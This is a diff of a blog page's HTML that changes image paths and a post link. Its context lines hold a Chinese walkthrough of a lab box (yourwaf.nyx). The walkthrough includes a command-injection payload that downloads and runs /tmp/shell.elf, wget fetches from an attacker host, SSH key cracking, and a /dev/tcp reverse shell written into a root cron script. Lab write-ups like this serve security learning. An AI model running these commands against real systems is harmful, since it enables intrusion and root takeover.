@@ -516,17 +516,17 @@ curl x.x.x.x -I
             <div id="articleContent">
                 <pre><code>arp-scan -l</code></pre><p>扫除目标ip</p>
 <p>rustscan</p>
-<pre><code>rustscan -a x.x.x.x -- -sV -sC</code></pre><p><img src="%5Cmedias%5Cfeatureimages%5Cimage-20240615002211131.png" alt="image-20240615002211131"></p>
+<pre><code>rustscan -a x.x.x.x -- -sV -sC</code></pre><p><img src="/medias/%5Cfeatureimages%5Cimage-20240615002211131.png" alt></p>
 <p>看到个3000端口，试了一下好像是进不去的</p>
 <p>我们查看一下web请求</p>
 <p>curl x.x.x.x -I</p>
-<p><img src="%5Cmedias%5Cfeatureimages%5Cimage-20240615003156838.png" alt="image-20240615003156838"></p>
+<p><img src="/medias/%5Cfeatureimages%5Cimage-20240615003156838.png" alt></p>
 <p>看到是302响应跳转 我们需要在/etc/hosts 下修改IP  domain</p>
-<pre><code>vi /etc/hosts</code></pre><p><img src="%5Cmedias%5Cfeatureimages%5Cimage-20240615003438025.png" alt="image-20240615003438025"></p>
+<pre><code>vi /etc/hosts</code></pre><p><img src="/medias/%5Cfeatureimages%5Cimage-20240615003438025.png" alt></p>
 <h4 id="然后这边子域名扫描"><a href="#然后这边子域名扫描" class="headerlink" title="然后这边子域名扫描"></a>然后这边子域名扫描</h4><pre><code>ffuf -w  /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u &#39;http:www.yourwaf.nyx&#39; -H &quot;Host: FUZZ.yourwaf.nyx&quot; -H &quot;X-Originating-IP:127.0.0.1&quot; -H &quot;X-Forwarded-For: 127.0.0.1&quot; -H &quot;X-Remote-IP: 127.0.0.1&quot; --fc 302,403 -H &#39;User-Agent: Mozilla&#39;</code></pre><p>扫描出问题的话可以去看一下ffuf工具文档地址<a href="https://github.com/ffuf/ffuf" target="_blank" rel="noopener">https://github.com/ffuf/ffuf</a></p>
 <p>我们扫到一个maintenance子域名，还有个User-Agent: Mozilla</p>
 <p>然后把这个子域名添加到/etc/hosts 进行访问</p>
-<p><img src="%5Cmedias%5Cfeatureimages%5Cimage-20240615004540054.png" alt="image-20240615004540054"></p>
+<p><img src="/medias/%5Cfeatureimages%5Cimage-20240615004540054.png" alt></p>
 <p>看到一个简单的表单，然后输入id测试一下发现好像是个命令执行页面</p>
 <p>让后我们可以利用命令执行反弹shell</p>
 <p>我们先生成一个revshell， 让后开启web服务</p>
@@ -551,11 +551,11 @@ P]/tmp;$b;IFS=];c=chmod]+x]/tmp/shell.elf;$c;IFS=];d=/tmp/shell.elf;$d</code></p
 <pre><code>script /dev/null -qc /bin/bash</code></pre><p>最后reset</p>
 <pre><code>reset</code></pre><p>然后在wget一下</p>
 <pre><code>wget http://192.168.193.128/pspy64</code></pre><p>然后给这个文件提升一下权限然后运行</p>
-<pre><code>chmod +x pspy64 ./pspy64</code></pre><p><img src="%5Cmedias%5Cfeatureimages%5Cimage-20240616014446247.png" alt="image-20240616014446247"></p>
+<pre><code>chmod +x pspy64 ./pspy64</code></pre><p><img src="/medias/%5Cfeatureimages%5Cimage-20240616014446247.png" alt></p>
 <p>可以看到每隔一段时间就会运行/opt/nodeapp/copylogs.sh</p>
 <p>我们进这个目录去看一下</p>
 <pre><code>cd /opt/nodeapp/copylogs.sh</code></pre><pre><code>ps aux |grep node</code></pre><p>看到一个server.js文件可以cat来查看一下</p>
-<p><img src="%5Cmedias%5Cfeatureimages%5Cimage-20240616015205991.png" alt="image-20240616015205991"></p>
+<p><img src="/medias/%5Cfeatureimages%5Cimage-20240616015205991.png" alt></p>
 <pre><code>cat server.js</code></pre><p>看到这个有个文件读取的漏洞</p>
 <pre><code>const express = require(&#39;express&#39;)
 const { exec } = require(&#39;child_process&#39;);
@@ -620,7 +620,7 @@ app.listen(port,  () =&gt; {
 <pre><code>ssh2john tester &gt; testerhash</code></pre><pre><code>john testerhash</code></pre><p>爆破出来就可以直接登陆了</p>
 <p>登陆后id看一下没有啥</p>
 <p>继续使用pspy工具探测一下</p>
-<pre><code>wget http://192.168.193.128/pspy64.pspy64</code></pre><pre><code>chmod +x pspy64.pspy64</code></pre><pre><code>./pspy64.pspy64</code></pre><p><img src="%5Cmedias%5Cfeatureimages%5Cimage-20240616024542988.png" alt="image-20240616024542988"></p>
+<pre><code>wget http://192.168.193.128/pspy64.pspy64</code></pre><pre><code>chmod +x pspy64.pspy64</code></pre><pre><code>./pspy64.pspy64</code></pre><p><img src="/medias/%5Cfeatureimages%5Cimage-20240616024542988.png" alt></p>
 <p>发现这个文件每隔一段时间就会执行一次，这个程序是root权限，但是我们当前用户拥有所属组的权限，可以进行修改这个文件反弹shell</p>
 <pre><code>cd /opt/nodeapp/</code></pre><pre><code>nano copylogs.sh</code></pre><pre><code>bash -i &gt;&amp; /dev/tcp/192.168.193.128/8888 0&gt;&amp;1</code></pre><p>然后去监听等他文件自动执行登陆</p>
 <pre><code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><pre><code>stty raw -echo;fg;export SHELL=/bin/bash;export TERM=xterm-256color;</code></pre><p>最后拿到flag  </p>
@@ -1118,20 +1118,20 @@ cat  root-e765ca897810e6e2da0e594113bfe9b3.txt
             <div class="article-badge left-badge text-color">
                 <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/01/14/lwaq/">
+                <a href="/2023/01/14/5w2h-godweiyang/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/26.jpg" class="responsive-img" alt="2024 | 网络安全">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="2024 | 博客前传">
                         
-                        <span class="card-title">2024 | 网络安全</span>
+                        <span class="card-title">2024 | 博客前传</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
                             
-VPN 技术l VPN定义：虚拟专用网(Virtual Private Network)是一种“通过共享的公共网络建立私有的数据通道，将各个需要接入这张虚拟网的网络或终端通过通道连接起来，构成一个专用的、具有一定安全性和服务质量保证的网络
+When？什么时候开始写的？第一次写博客是 2023 年了，在 CSDN 和博客园上面，当时写文章是为了记录主要还是因为 CSDN 和博客园的体验太差了，写起文章来很难受，又丑又慢。另一个原因是， CSDN 发个文章还需要审核，定制主题自
                         
                     </div>
                     <div class="publish-info">
@@ -1142,8 +1142,8 @@ VPN 技术l VPN定义：虚拟专用网(Virtual Private Network)是一种“通�
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/网络安全/" class="post-category" target="_blank">
-                                    网络安全
+                            <a href="/categories/随笔/" class="post-category" target="_blank">
+                                    随笔
                                 </a>
                             
                             
@@ -1153,8 +1153,8 @@ VPN 技术l VPN定义：虚拟专用网(Virtual Private Network)是一种“通�
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/网络安全/" target="_blank">
-                        <span class="chip bg-color">网络安全</span>
+                    <a href="/tags/博客/" target="_blank">
+                        <span class="chip bg-color">博客</span>
                     </a>
                     
                 </div>
